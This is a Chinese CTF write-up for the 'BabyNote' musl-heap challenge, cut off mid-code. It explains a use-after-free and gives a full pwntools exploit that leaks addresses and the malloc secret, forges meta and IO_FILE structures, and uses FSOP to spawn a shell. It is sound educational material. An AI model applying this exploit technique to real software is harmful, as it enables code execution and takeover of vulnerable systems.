id="BabyNote"><a href="#BabyNote" class="headerlink" title="BabyNote"></a>BabyNote</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这道题的逆向过程也不是很难，可以知道题目维护的是一个单链表的结构</p><p>在比赛期间没发现这道题的漏洞，看了wp发现我少考虑了一种极端情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_16A1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 *i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0LL</span>;</span><br><span class="line">  v3 = give_name((__int64 *)&amp;v1);</span><br><span class="line">  ptr = (<span class="keyword">void</span> *)_int_find(v1, v3);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptr != (<span class="keyword">void</span> *)chunk_start || *(_QWORD *)(chunk_start + <span class="number">0x20</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_QWORD *)ptr + <span class="number">4</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = &amp;chunk_start; ptr != (<span class="keyword">void</span> *)*i; i = (__int64 *)(*i + <span class="number">0x20</span>) )</span><br><span class="line">          ;</span><br><span class="line">        *i = *((_QWORD *)ptr + <span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      chunk_start = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)ptr);</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oops.....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;<span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_16A1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 *i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0LL</span>;</span><br><span class="line">  v3 = give_name((__int64 *)&amp;v1);</span><br><span class="line">  ptr = (<span class="keyword">void</span> *)_int_find(v1, v3);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptr != (<span class="keyword">void</span> *)chunk_start || *(_QWORD *)(chunk_start + <span class="number">0x20</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_QWORD *)ptr + <span class="number">4</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = &amp;chunk_start; ptr != (<span class="keyword">void</span> *)*i; i = (__int64 *)(*i + <span class="number">0x20</span>) )</span><br><span class="line">          ;</span><br><span class="line">        *i = *((_QWORD *)ptr + <span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      chunk_start = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)ptr);</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oops.....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是当最后一个结点(也是第一个生成的结点)被删除的时候，倒数第二个结点(也就是第二个生成的结点)的next指针还是会指向最后一个结点，这也就造成了UAF</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>首先生成UAF的chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220510102335264.png"                      alt="image-20220510102335264"                ></p><p>可以看到其实已经是造成了UAF了</p><p>这个时候我们如果在free的chunk这里生成一个管理堆块即可泄漏出堆地址，但是上面提到了musl在free后不会直接该表avail的值，而是等avail用完了才会根据freed修改avail。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220510103046917.png"                      alt="image-20220510103046917"                ></p><p>可以看到当前的meta，题目的show函数也是会创建chunk然后free掉的，所以修改掉即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220510103350652.png"                      alt="image-20220510103350652"                ></p><p>那么下一次申请的管理堆块就会是我们上面的内容堆块</p><p>我发现如果单纯的按照上面的操作会出现后面生成的管理堆会覆盖掉以前的管理堆导致破坏了UAF，所以我在前面新增了一段代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;d&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="string">b&#x27;d&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220510105155095.png"                      alt="image-20220510105155095"                ></p><p>从而达到这种效果，使我们造成UAF的管理堆块在group的最后，避免覆盖</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220510105526734.png"                      alt="image-20220510105526734"                ></p><p>接着进行上面的步骤即可实现这一效果</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220510110419373.png"                      alt="image-20220510110419373"                ></p><p>紧接着泄漏地址</p><p>根据上面描述的，我们最终利用的其实是dequeue当中的任意地址写，但是在进入这个函数之前会检测secrt值，所以我们还需要泄漏一次，这次泄漏的思路和上面差不多，这里可以通过show函数修改掉我们最开始管理堆块即可进行泄漏。</p><p>到这里已经泄漏完所有的东西了，下一步就是伪造IO_FILE进行FSOP来getshell了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;babynote&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babynote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_size, name, note_size, note</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;option: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(name_size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;note size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(note_size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;note content: &#x27;</span>)</span><br><span class="line">    r.send(note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">name_size, name</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;option: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(name_size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">name_size, name</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;option: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(name_size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forget</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;option: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;d&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="string">b&#x27;d&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    find(<span class="number">0x28</span>, <span class="string">b&#x27;1&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">forget()</span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;c&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x58</span>, <span class="string">b&#x27;c&#x27;</span> * <span class="number">0x58</span>)</span><br><span class="line">find(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x28:&#x27;</span>)</span><br><span class="line">elf_base = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">libc_base = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    elf_base = r.recv(<span class="number">2</span>) + elf_base</span><br><span class="line">r.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    libc_base = r.recv(<span class="number">2</span>) + libc_base</span><br><span class="line">elf_base = <span class="built_in">int</span>(elf_base, base=<span class="number">16</span>) - <span class="number">0x4dc0</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_base, base=<span class="number">16</span>) - <span class="number">0xb7870</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">__malloc_context = libc_base + <span class="number">0xb4ac0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">payload = flat(elf_base + <span class="number">0x4cc0</span>, __malloc_context, <span class="number">0x38</span>, <span class="number">0x28</span>, <span class="number">0</span>)</span><br><span class="line">find(<span class="number">0x28</span>, payload)</span><br><span class="line">find(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x28:&#x27;</span>)</span><br><span class="line">secret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    secret = r.recv(<span class="number">2</span>) + secret</span><br><span class="line">secret = <span class="built_in">int</span>(secret, base=<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(secret))</span><br><span class="line"></span><br><span class="line">__stdout_used = libc_base + <span class="number">0xb43b0</span></span><br><span class="line">heap_addr = libc_base - <span class="number">0x7000</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_area_addr = heap_addr + <span class="number">0x1000</span></span><br><span class="line">fake_meta_addr = fake_area_addr + <span class="number">0x10</span></span><br><span class="line">fake_group_addr = fake_meta_addr + <span class="number">0x30</span></span><br><span class="line">fake_IO_FILE_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area = flat(secret, <span class="number">0</span>)</span><br><span class="line">fake_meta = flat(fake_IO_FILE_addr, __stdout_used, fake_group_addr, (<span class="number">1</span> &lt;&lt; <span class="number">1</span>),</span><br><span class="line">                 (<span class="number">20</span> &lt;&lt; <span class="number">6</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">5</span>) | <span class="number">1</span> | (<span class="number">0xfff</span> &lt;&lt; <span class="number">12</span>))</span><br><span class="line">fake_meta = fake_meta.ljust(<span class="number">0x30</span>)</span><br><span class="line">fake_group = flat(fake_meta_addr, <span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + <span class="string">b&#x27;X&#x27;</span> * <span class="number">8</span> + p64(</span><br><span class="line">    <span class="number">0xbeefdead</span>) + p64(system) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x500</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (</span><br><span class="line">    <span class="number">0x1000</span> - <span class="number">0x20</span>) + fake_meta_area + fake_meta + fake_group + fake_IO_FILE</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&quot;z&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;e&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x2000</span>, payload)</span><br><span class="line"></span><br><span class="line">fake_name_addr = elf_base + <span class="number">0x4d80</span></span><br><span class="line">fake_note = flat(fake_name_addr, fake_IO_FILE_addr, <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="number">0</span>)</span><br><span class="line">fake_note_addr = libc_base + <span class="number">0xb7d50</span></span><br><span class="line">create(<span class="number">0x4</span>, <span class="string">b&#x27;f&#x27;</span> * <span class="number">0x4</span>, <span class="number">0x28</span>, fake_note)</span><br><span class="line">create(<span class="number">0x4</span>, <span class="string">b&#x27;g&#x27;</span> * <span class="number">0x4</span>, <span class="number">0x38</span>, <span class="string">b&#x27;h&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">payload = flat(elf_base + <span class="number">0x4cc0</span>, __malloc_context, <span class="number">0x38</span>, <span class="number">0x28</span>, fake_note_addr)</span><br><span class="line">find(<span class="number">0x28</span>, payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0x38</span>, <span class="string">b&#x27;h&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;option: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(</span></span><br><span class="line"><span class="comment">#     r,</span></span><br><span class="line"><span class="comment">#     &#x27;dir /mnt/hgfs/download/musl/musl-1.2.2/musl-1.2.2/src/malloc\ndir /mnt/hgfs/download/musl/musl-1.2.2/musl-1.2.2/src/malloc/mallocng\nb free&#x27;</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="构造meta"><a href="#构造meta" class="headerlink" title="构造meta"></a>构造meta</h3><p>这里再继续花上一点篇幅讲解一下怎么构造meta，其实看别人博客也把我看晕了，自己对照源码然后调试发现并不难，所以我的exp也就整体进行了缩减。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line"><span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line"><span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line"><span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">dequeue(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">activate_group(ctx.active[sc]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们如果想要进入dequeue需要进入if判断，并且内部还有个assert，我们需要绕过这两项。</p><p>再关注一下meta结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line"><span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line"><span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line"><span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先看if判断的第一个内容，我们先看一下在exp当中构造的meta的最后是什么形式表现的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220510154833852.png"                      alt="image-20220510154833852"                ></p><p>可以看到这里的avail_mask和freed_mask的或值是2等号左半边的值即为3，再看last_idx那么有半边也为3了，就轻松绕过了。再看后面的那个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 